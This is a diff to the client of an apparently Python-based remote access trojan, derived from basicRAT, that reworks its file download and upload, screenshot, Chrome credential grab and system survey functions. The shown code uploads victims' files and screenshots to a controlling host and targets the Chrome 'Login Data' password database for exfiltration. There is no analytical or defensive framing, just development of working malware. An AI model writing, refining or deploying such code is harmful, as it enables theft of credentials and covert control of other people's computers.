@@ -30,7 +30,7 @@ else:
     pass
 
 HOST = '127.0.0.1'
-PORT = int('8000')
+PORT = 8000
 
 def crypt(TEXT, encode=True):
     if encode == True:
@@ -43,7 +43,7 @@ def send(data):
     s.sendall(crypt(data))
 
 def download(command):
-    fileName = command.replace("upload ", "")
+    fileName = command[len("upload "):]
 
     f = open(fileName, 'wb')
     while True:
@@ -65,11 +65,11 @@ def download(command):
     main()
 
 def upload(command):
-    if "screenshot() download " in command:
-        fileName = command.replace("screenshot() download ", "")
-
+    if "screenshot" in command:
+        fileName = str(command[len("screenshot() download "):])
     else:
-        fileName = command.replace("download ", "")
+        fileName = str(command[len("download "):])
+
     try:
         f = open(fileName, 'rb')
         l = f.read(1024)
@@ -89,8 +89,8 @@ def upload(command):
 
 def screenshot(command):
     if os.name == "nt":
-        fileName = command.replace("screenshot() ", "")
-        for file in sct.save(mon=-1, output="%s"%(fileName.replace("download ", ""))):
+        fileName = command.split()[-1]
+        for file in sct.save(mon=-1, output="%s"%(fileName)):
             pass
         upload(command)
     else:
@@ -101,7 +101,7 @@ def chrome_db():
     global db_name
     if os.name == "nt":
         db_name = os.path.expanduser('~')+"\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
-        upload("download %s"%(db_name))
+        upload("download "+db_name)
     else:
         s.sendall("[!] This func, works only on Windows!\n")
         main()
@@ -117,19 +117,19 @@ def info():
 # https://github.com/vesche/basicRAT
 #
     SURVEY_FORMAT = '''
-    System Platform     - {}
-    Processor           - {}
-    Architecture        - {}
-    Internal IP         - {}
-    External IP         - {}
-    MAC Address         - {}
-    Internal Hostname   - {}
-    External Hostname   - {}
-    Hostname Aliases    - {}
-    FQDN                - {}
-    Current User        - {}
-    System Datetime     - {}
-    Admin Access        - {}'''
+[-o-] System Platform     - {}
+[-o-] Processor           - {}
+[-o-] Architecture        - {}
+[-o-] Internal IP         - {}
+[-o-] External IP         - {}
+[-o-] MAC Address         - {}
+[-o-] Internal Hostname   - {}
+[-o-] External Hostname   - {}
+[-o-] Hostname Aliases    - {}
+[-o-] FQDN                - {}
+[-o-] Current User        - {}
+[-o-] System Datetime     - {}
+[-o-] Admin Access        - {}'''
 
 
     def run(plat):
